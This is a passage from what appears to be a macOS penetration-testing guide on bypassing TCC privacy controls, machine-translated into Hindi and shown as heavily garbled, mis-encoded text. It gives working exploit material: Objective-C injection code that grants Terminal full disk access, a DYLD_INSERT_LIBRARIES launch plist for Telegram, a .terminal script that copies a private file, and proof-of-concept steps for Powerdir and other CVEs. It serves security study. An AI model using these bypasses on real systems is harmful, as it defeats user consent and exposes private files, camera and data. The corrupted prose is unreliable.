рдпрд╣ **`rename(a, b);`** рд╡реНрдпрд╡рд╣рд╛рд░ рдПрдХ **рд░реЗрд╕ рдХрдВрдбреАрд╢рди** рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд░рдорд┐рдд рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ "Automatically Add to Music.localized" рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рдирдХрд▓реА **TCC.db** рдлрд╝рд╛рдЗрд▓ рдбрд╛рд▓реА рдЬрд╛рдП рдФрд░ рдлрд┐рд░ рдЬрдм рдирдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ (b) рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдлрд╝рд╛рдЗрд▓ рдХреА рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕реЗ **`~/Library/Application Support/com.apple.TCC`**/ рдХреА рдУрд░ рдкреЙрдЗрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

рдпрджрд┐ **`SQLITE_SQLLOG_DIR="рдкрде/рдлрд╝реЛрд▓реНрдбрд░"`** рд╣реИ, рддреЛ рдпрд╣ рдорддрд▓рдм рд╣реЛрддрд╛ рд╣реИ рдХрд┐ **рдХрд┐рд╕реА рднреА рдЦреБрд▓реА рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЙрд╕ рдкрде рдкрд░ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕ CVE рдореЗрдВ рдЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬрд┐рд╕рдореЗрдВ FDA рд╡рд╛рд▓реА TCC рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реЛ, рдЙрд╕рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХреЗ, рдФрд░ рдлрд┐рд░ **`SQLITE_SQLLOG_DIR`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдореЗрдВ рдПрдХ **рд╕рд┐рдВрдмрд▓рд┐рдВрдХ** рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рддрд╛рдХрд┐ рдЬрдм рд╡рд╣ рдбреЗрдЯрд╛рдмреЗрд╕ **рдЦреЛрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **TCC.db рдУрд╡рд░рд░рд╛рдЗрдЯ** рд╣реЛ рдЬрд╛рддреА рд╣реИред\
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ**](https://youtu.be/f1HA5QhLQ7Y?t=20548)ред

### **SQLITE\_AUTO\_TRACE**

рдпрджрд┐ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ **`SQLITE_AUTO_TRACE`** рд╕реЗрдЯ рд╣реИ, рддреЛ рдкреБрд╕реНрддрдХрд╛рд▓рдп **`libsqlite3.dylib`** рд╕рднреА SQL рдХреНрд╡реЗрд░реА рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрдЧреАред рдХрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рдереЗ, рдЗрд╕рд▓рд┐рдП рдЙрдирдХреЗ рд╕рднреА SQLite рдХреНрд╡реЗрд░реА рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред

рдХрдИ Apple рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ TCC рд╕реБрд░рдХреНрд╖рд┐рдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ред
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple Remote Desktop

рдЬреИрд╕реЗ рд╣реА рдЖрдк рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕ рд╕реЗрд╡рд╛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ, **ARD рдПрдЬреЗрдВрдЯ рдХреЛ рдкреВрд░реА рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕** рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдПрдХ рдирдпрд╛ **TCC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЙрдкреА рдХрд░ рд╕рдХреЗред

## **NFSHomeDirectory** рджреНрд╡рд╛рд░рд╛

TCC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ HOME рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ **$HOME/Library/Application Support/com.apple.TCC/TCC.db**ред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ $HOME env рдЪрд░ рдХреЗ рд╕рд╛рде рдПрдХ **рдЕрд▓рдЧ рдлрд╝реЛрд▓реНрдбрд░** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП TCC рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рднреА рдРрдк рдХреЛ рдХрд┐рд╕реА рднреА TCC рдЕрдиреБрдорддрд┐ рдХреЗ рд▓рд┐рдП TCC рдбреЗрдЯрд╛рдмреЗрд╕ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред **/Library/Application Support/com.apple.TCC/TCC.db** рдФрд░ TCC рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗ рд╕рдХрддрд╛ рд╣реИред

{% hint style="success" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Apple рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕реЗрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ **`NFSHomeDirectory`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ **`$HOME`** рдХреЗ рдорд╛рди рдХреЗ рд▓рд┐рдП, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рд╣реИ (**`kTCCServiceSystemPolicySysAdminFiles`**), рддреЛ рдЖрдк рдПрдХ TCC рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рд╕рд╛рде рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ **рдпреБрджреНрдзрд╛рд╕реНрдкрдж** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### [CVE-2020тАУ9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**рдкрд╣рд▓рд╛ POC** [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) рдФрд░ [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ **HOME** рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

1. рд▓рдХреНрд╖реНрдп рдРрдк рдХреЗ рд▓рд┐рдП _csreq_ рдмреНрд▓реЙрдм рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
2. рдЖрд╡рд╢реНрдпрдХ рдЙрдкрдпреЛрдЧ рдФрд░ _csreq_ рдмреНрд▓реЙрдм рдХреЗ рд╕рд╛рде рдПрдХ рдирдХрд▓реА _TCC.db_ рдлрд╝рд╛рдЗрд▓ рдкреНрд▓рд╛рдВрдЯ рдХрд░реЗрдВред
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗрд╡рд╛рдУрдВ рдПрдВрдЯреНрд░реА рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░реЗрдВред
4. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗрд╡рд╛рдУрдВ рдПрдВрдЯреНрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмрджрд▓ рдЬрд╛рдПред
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд╢реЛрдзрд┐рдд рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗрд╡рд╛рдУрдВ рдПрдВрдЯреНрд░реА рдХреЛ рдЖрдпрд╛рдд рдХрд░реЗрдВред
6. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ _tccd_ рдХреЛ рд░реЛрдХреЗрдВ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░реЗрдВред

рджреВрд╕рд░рд╛ POC **`/usr/libexec/configd`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `com.apple.private.tcc.allow` рд╡реИрд▓реНрдпреВ `kTCCServiceSystemPolicySysAdminFiles` рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИред\
рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ **`configd`** рдХреЛ **`-t`** рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдПрдХ **рдХрд╕реНрдЯрдо Bundle рд▓реЛрдб** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ **`dsexport`** рдФрд░ **`dsimport`** рд╡рд┐рдзрд┐ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП **`configd` рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди** рдХреЗ рд╕рд╛рде рдмрджрд▓ рджреЗрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) рджреЗрдЦреЗрдВред

## рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдФрд░ рдЙрд╕рдХреЗ TCC рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, TCC рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди **рдкреНрд▓рдЧрдЗрдиреНрд╕ (рд▓реЛрдб рдкреБрд╕реНрддрдХрд╛рд▓рдп)** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдкреНрд▓рдЧрдЗрдиреНрд╕ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЛрдб рдЖрдорддреМрд░ рдкрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдпрд╛ рдкреНрд▓рд┐рд╕реНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ **рдореБрдЦреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ** рдФрд░ рдЗрд╕рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдореБрдЦреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ TCC рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ (рдЕрдиреБрдорддрд┐рдпреЛрдВ рдпрд╛ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ **рдХрд╕реНрдЯрдо рдХреЛрдб рднреА рдЙрд╕реЗ рд╣реЛрдЧрд╛**ред

### CVE-2020-27937 - Directory Utility

рдРрдкреНрд▓рд┐рдХреЗрд╢рди `/System/Library/CoreServices/Applications/Directory Utility.app` рдореЗрдВ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ **`kTCCServiceSystemPolicySysAdminFiles`**, **`.daplug`** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реЗ рдкреНрд▓рдЧрдЗрдиреНрд╕ рд▓реЛрдб рдХрд░рддрд╛ рдерд╛ рдФрд░ **рд╣рд╛рд░реНрдбрди** рд░рдирдЯрд╛рдЗрдо рдирд╣реАрдВ рдерд╛ред

рдЗрд╕ CVE рдХреЛ рдпреБрджреНрдзрд╛рд╕реНрдкрдж рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, **`NFSHomeDirectory`** рдХреЛ **рдмрджрд▓рд╛** рдЬрд╛рддрд╛ рд╣реИ (рдкрд┐рдЫрд▓реЗ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ) рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ TCC рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд▓реЗ рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://wojciechregula.blog/post/change-home-directory-and
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) рджреЗрдЦреЗрдВред

### рдбрд┐рд╡рд╛рдЗрд╕ рдЕрд╡рд╕реНрдерд╛рди рдкрд░рдд (DAL) рдкреНрд▓рдЧ-рдЗрдиреНрд╕

рдХреЛрд░ рдореАрдбрд┐рдпрд╛ I/O рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреИрдорд░рд╛ рд╕реНрдЯреНрд░реАрдо рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди (**`kTCCServiceCamera`** рд╡рд╛рд▓реЗ рдРрдкреНрд╕) `/Library/CoreMediaIO/Plug-Ins/DAL` рдореЗрдВ рд╕реНрдерд┐рдд рдЗрди рдкреНрд▓рдЧ-рдЗрдиреНрд╕ рдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ (SIP рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ)ред

рд╡рд╣рд╛рдВ рдПрдХ рд╕рд╛рдзрд╛рд░рд┐рдд **рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░** рдХреЗ рд╕рд╛рде рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдирд╛ рдХреЛрдб **рдЗрдВрдЬреЗрдХреНрд╢рди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░реЗрдЧрд╛ред

рдЗрд╕рдореЗрдВ рдХрдИ Apple рдПрдкреНрд▓рд┐рдХреЗрд╢рди рднреА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдереЗред

### Firefox

Firefox рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ `com.apple.security.cs.disable-library-validation` рдФрд░ `com.apple.security.cs.allow-dyld-environment-variables` рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рдереЗ:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
рдЗрд╕ [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](https://wojciechregula.blog/post/how-to-rob-a-firefox/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдПред

### CVE-2020-10006

рдмрд╛рдЗрдирд░реА `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` рдореЗрдВ **`com.apple.private.tcc.allow`** рдФрд░ **`com.apple.security.get-task-allow`** рдЗрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯреНрд╕ рдереЗ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдФрд░ TCC рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реАред

### CVE-2023-26818 - Telegram

Telegram рдореЗрдВ **`com.apple.security.cs.allow-dyld-environment-variables`** рдФрд░ **`com.apple.security.cs.disable-library-validation`** рдЗрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯреНрд╕ рдереЗ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХрддреА рдереА, рдЬреИрд╕реЗ рдХреИрдорд░реЗ рдХреЗ рд╕рд╛рде рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рдХрд░рдирд╛ред рдЖрдк [**рд╡реНрд░рд┐рдЯрдЕрдк рдореЗрдВ рдкреЗрд▓реЛрдб рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдХрд╕реНрдЯрдо рдкреНрд▓рд┐рд╕реНрдЯ** рдХреЛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ рдПрдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдИ рдЧрдИ рдереА рдФрд░ **`launchctl`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## рдЦреБрд▓реЗ рдЖрд╡рд╛рд╣рди рджреНрд╡рд╛рд░рд╛

рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдмреАрдЪ **`open`** рдХреЛ рдЖрд╡рд╛рд╣рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### рдЯрд░реНрдорд┐рдирд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕

рдЯреЗрдХреНрдирд┐рдХрд▓ рд▓реЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдореЗрдВ рдЯрд░реНрдорд┐рдирд▓ рдХреЛ **рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕ (FDA)** рджреЗрдирд╛ рдЖрдо рдмрд╛рдд рд╣реИред рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **`.terminal`** рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдЖрд╡рд╛рд╣рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

**`.terminal`** рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ plist рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдЗрд╕рдореЗрдВ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`CommandString`** рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рдРрд╕реА рд╕реНрдерд╛рди рдкрд░ рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рд┐рдЦ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ /tmp рдФрд░ рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХрддреА рд╣реИ:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
